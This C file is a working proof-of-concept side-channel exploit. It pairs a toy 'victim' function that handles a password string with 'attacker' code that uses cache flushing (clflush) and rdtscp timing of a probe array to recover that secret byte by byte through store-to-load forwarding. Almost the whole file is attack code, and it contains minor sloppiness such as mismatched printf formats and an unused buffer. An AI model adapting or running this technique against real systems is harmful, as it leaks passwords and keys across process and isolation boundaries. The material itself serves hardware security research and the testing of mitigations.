#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define PAGE_SIZE 4096
#define ALIGN_UP(x, alignment) ((((uint64_t)x+(alignment-1))/alignment)*alignment)

/********************************************************************
Victim code.
********************************************************************/

uint8_t g_array[256 * 512];

char* secret = "The password is rootkea";

uint8_t temp = 0; /* Used so compiler won’t optimize out store_load_forwarding_victim() */

char g_secret_out[PAGE_SIZE * 2];

void store_load_forwarding_victim(int8_t* address) {
    // need to do a load from address X and then a store to address Y
    // such that X = Y (mod 4096)

    uint64_t offset = ((uint64_t)address) % 4096;

    // flush the out buffer of the secret
    for (size_t i = 0; i < PAGE_SIZE / 4; i++)
    {
        _mm_clflush(&g_secret_out[i * 8]);
    }

    // use an offset in the out buffer (inaccessible to the attacker) with the
    // same offset as the attacker's supplied address
    char* aligned_out_addr = (char*)(ALIGN_UP(g_secret_out, PAGE_SIZE) + offset);

    // write secret into the out buffer
    *aligned_out_addr = secret[offset];

    // load data from the attacker's address, which has the same offset
    // in the page as our secret, due to store/load forwarding the
    // processor is expected to try and execute this instruction
    // with the secret value
    temp &= g_array[*address * 512];

#ifdef SIMULATE_SLF_MEM_DISAMBIGUATION
    // If we want to simulate what would have happened if the store-load-forwarding feature
    // would've caused the processor to access the stored value (secret[offset]) we can
    // simply do so explicitly in code and see the results
    temp &= g_array[secret[offset] * 512];
#endif
}

/********************************************************************
Attacker code
********************************************************************/

// Get the two indexes with the biggest values in results (first is assigned the index of the
// biggest value and second is assigned the index of the second biggest value).
void get_top_two(int results[256], int* first, int* second)
{
    int j, k;

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (int i = 0; i < 256; i++) {
        if (j < 0 || results[i] >= results[j]) {
            k = j;
            j = i;
        }
        else if (k < 0 || results[i] >= results[k]) {
            k = i;
        }
    }

    *first = j;
    *second = k;
}

// Adds +1 to all indexes in which the duration was no bigger than 1.5 times the minimal
// value of all durations.
//
// This allows our code to be independent of the cache hit/miss times, and consider an entry
// cached in the TLB as long as it is consistently faster to access than the rest of the
// entries.
void add_top_results(int results[256], uint64_t durations[256], char value_to_ignore)
{
    // find the shortest duration
    uint64_t shortest_duration = (uint64_t)-1;

    for (size_t i = 0; i < 256; i++)
    {
        if (i == value_to_ignore)
            continue;

        if (durations[i] < shortest_duration)
        {
            shortest_duration = durations[i];
        }
    }

    // add +1 to all results that are no bigger than 1.5 times the shortest
    // duration
    for (size_t i = 0; i < 256; i++)
    {
        if (i == value_to_ignore)
            continue;

        if (durations[i] < shortest_duration * 3 / 2)
        {
            results[i]++;
        }
    }
}

/* Report best guess in value[0] and runner-up in value[1] */
int readSecret(size_t offset_in_secret, uint8_t* value) {
    int results[256] = { 0 };
    int tries, i, j, k, mix_i, junk = 0;
    const size_t buffer_size = 4096 * sizeof(uint64_t);
    char* buffer = (char*)malloc(buffer_size);
    char value_to_set = 155;

    memset(buffer, value_to_set, buffer_size);

    // align up
    char* aligned_address = (char*)ALIGN_UP(buffer, PAGE_SIZE);

    char* secret_out = (char*)malloc(PAGE_SIZE * 2);

    for (tries = 999; tries > 0; tries--) {
        uint64_t durations[256] = { 0 };

        // set our buffer to a different value in each try to minimize bias
        // (the actual value in our buffer will be used to access the global
        // array, we don't want to consider this as the secret so we'll use
        // varying values)
        memset(buffer, tries % 255, buffer_size);

        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&g_array[i * 512]); /* intrinsic for clflush instruction */

        // flush our buffer
        for (i = 0; i < buffer_size / 8; i++)
        {
            _mm_clflush(&buffer[i * 8]);
        }

        store_load_forwarding_victim(aligned_address + offset_in_secret);

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            register uint64_t start_time, duration;
            volatile uint8_t* addr;

            mix_i = ((i * 167) + 13) & 255;
            addr = &g_array[mix_i * 512];
            start_time = __rdtscp(&junk); /* READ TIMER */
            junk = *addr; /* MEMORY ACCESS TO TIME */
            duration = __rdtscp(&junk) - start_time; /* READ TIMER & COMPUTE ELAPSED TIME */
            durations[mix_i] = duration;
        }

        add_top_results(results, durations, value_to_set);

        int first, second;
        get_top_two(results, &first, &second);
        if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0))
        {
            *value = first;
            return 0;
        }
    }

    int first, second;
    get_top_two(results, &first, &second);
    printf("first=%lu, first counter=%lu, second=%lu, second count=%lu\n", first, results[first],
           second, results[second]);
    return 1; // failure
}

int main()
{
    char guessed_secret[23];
    for (size_t i = 0; i < 23; i++)
    {
        printf("Reading offset %lu ", i);
        char value;
        int res = readSecret(i, &value);
        if (res)
        {
            printf("failed to retrieve value");
        }
        else
        {
            printf("%c", value);
        }
        printf("\n");
    }
}
